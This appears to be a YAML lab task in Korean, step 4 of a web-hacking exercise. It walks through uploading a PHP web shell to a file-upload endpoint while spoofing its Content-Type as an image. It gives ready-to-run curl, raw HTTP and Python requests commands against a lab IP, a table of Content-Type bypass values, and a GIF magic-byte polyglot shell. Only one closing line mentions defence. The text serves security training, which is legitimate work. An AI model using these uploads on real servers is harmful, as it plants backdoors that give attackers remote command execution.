- order: 4
  instruction: |-
    {{WEB_IP}} 대상으로 Content-Type 변조 업로드을 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 도구 A — curl -F 의 type 옵션 (가장 쉬움)
    ```bash
    # PHP shell 을 image/jpeg 로 위장
    echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
    curl -X POST http://10.20.30.80/api/upload \
         -F "file=@/tmp/shell.php;type=image/jpeg"
    # type=...: Content-Type 헤더 강제 (기본 application/octet-stream → image/jpeg)
    ```

    ▶ 2단계: 도구 B — Burp Repeater 로 multipart 직접 편집
    ```http
    POST /api/upload HTTP/1.1
    Host: 10.20.30.80
    Content-Type: multipart/form-data; boundary=----X

    ------X
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: image/jpeg          <-- 변조

    <?php system($_GET['c']); ?>
    ------X--
    ```

    ▶ 3단계: 도구 C — Python requests
    ```python
    import requests
    files = {
      'file': ('shell.php', open('/tmp/shell.php', 'rb'), 'image/jpeg')
      #         filename       binary content              Content-Type 변조
    }
    r = requests.post('http://10.20.30.80/api/upload', files=files)
    print(r.status_code, r.text[:200])
    ```

    ▶ 4단계: Content-Type 우회 변형
    | 헤더 값 | 우회 시나리오 |
    |---|---|
    | `image/jpeg` | image-only 필터 우회 |
    | `image/png` | 동일 |
    | `text/plain` | CSRF preflight 회피 |
    | `application/pdf` | document-only 필터 우회 |
    | `application/octet-stream` (없음) | 기본값 |
    | 거짓 다중 (`type=image/jpeg, application/x-php`) | 일부 parser 가 첫 값만 |

    ▶ 5단계: 도구 D — magic byte + Content-Type 결합 (다음 step 6 와 연계)
    ```bash
    # GIF magic byte + PHP 코드 + Content-Type 변조
    printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > /tmp/shell.gif.php
    curl -F "file=@/tmp/shell.gif.php;type=image/gif" http://target/api/upload
    ```

    ▶ 6단계: 답변
    Content-Type 변조 명령 quote + 응답 (200 = 우회 성공) + 방어 (서버측 magic byte 검증) 1 문장.
